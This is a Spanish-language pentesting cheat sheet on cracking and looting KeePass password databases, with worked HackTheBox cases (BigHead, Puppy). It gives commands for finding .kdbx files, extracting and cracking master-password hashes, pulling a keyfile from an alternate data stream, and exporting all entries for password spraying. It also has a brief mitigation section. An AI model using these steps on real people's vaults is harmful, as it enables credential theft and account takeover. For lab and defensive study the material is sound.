---
topic: KeePass
tags: [windows, keepass, kdbx, keepassxc, argon2, password-manager, hashcat, key-file, alternate-data-stream]
---

# KeePass

[🌐 English](keepass.en.md) | **Español**

## Concepto

KeePass almacena credenciales en una base `.kdbx` protegida por una contraseña maestra y, opcionalmente, un archivo clave. Si el atacante obtiene la base, puede intentar crackear la contraseña maestra o usarla para abrir el gestor y extraer todos los secretos.

## Cuándo aplica

- Archivos `.kdbx` en un perfil o backup.
- Contraseña maestra débil o reutilizada.
- Archivo clave junto a la base.
- Proceso KeePass abierto en el equipo.

## Procedimiento

1. Localizar la base y el archivo clave.
2. Extraer el hash con `keepass2john`.
3. Crackear con Hashcat si es posible.
4. Abrir la base con `kpcli` o KeePass.
5. Inventariar y reutilizar credenciales.

```bash
find / -iname '*.kdbx' 2>/dev/null
keepass2john database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash wordlist.txt
kpcli --kdb database.kdbx
```

## Variantes

- Base con contraseña maestra y key file.
- Hash extraído de memoria o de un backup.
- Contraseña maestra reutilizada de otro servicio.
- Bases en unidades de red o repositorios.

## Limitaciones

- Una contraseña fuerte hace inviable el cracking.
- Sin el key file no se abre la base.
- La versión de KeePass cambia el formato.
- El proceso puede requerir interacción.

## Mitigación y detección

- Usar contraseñas maestras fuertes y únicas.
- Guardar el key file por separado.
- Restringir acceso a `.kdbx` y backups.
- Alertar de acceso masivo a gestores y archivos de credenciales.

## Caso real: keyfile en un flujo alternativo (BigHead)

En BigHead la base `.kdbx` y su keyfile no están en archivos separados: el keyfile se guarda en un *alternate data stream* (ADS) del propio `.kdbx`. PowerShell lo lista y lo extrae sin necesidad de crackear la contraseña maestra.

```powershell
Get-Item .\*.kdbx -Stream *
Get-Content .\database.kdbx -Stream keyfile -Encoding Byte -TotalCount 32 | Set-Content .\keyfile.key -Encoding Byte
```

```bash
kpcli --kdb database.kdbx --key keyfile.key
```

Si solo se dispone del hash, `keepass2john` no procesa el keyfile: hay que crackear la contraseña maestra y después abrir la base con el keyfile. Los ADS también aparecen en backups y en archivos descargados desde un servidor Windows.

## Caso Puppy: KeePassXC y Argon2

En Puppy, el share `dev` contiene `recovery.kdbx` y el instalador de KeePassXC. La base usa KDBX 4 con Argon2, así que `keepass2john` clásico puede no generar un hash válido; `john-the-ripper.keepass2john` sí lo procesa. Tras crackear la contraseña maestra, `keepassxc-cli export --format csv` vuelca todas las entradas y esas contraseñas alimentan un spray contra el dominio.

```bash
john-the-ripper.keepass2john recovery.kdbx > recovery.hash
john --wordlist=rockyou.txt recovery.hash
keepassxc-cli export --format csv recovery.kdbx
```

El mismo patrón aplica a bases encontradas en shares, backups o perfiles de usuario. Si el export incluye TOTP, conviene separar las contraseñas de los códigos y probar primero las cuentas de servicio.

## Referencias

- <https://keepass.info/help/base/security.html>
- <https://github.com/openwall/john>
- <https://attack.mitre.org/techniques/T1555/005/>
- <https://0xdf.gitlab.io/2025/09/27/htb-puppy.html>
- <https://keepassxc.org/docs/KeePassXC_UserGuide>
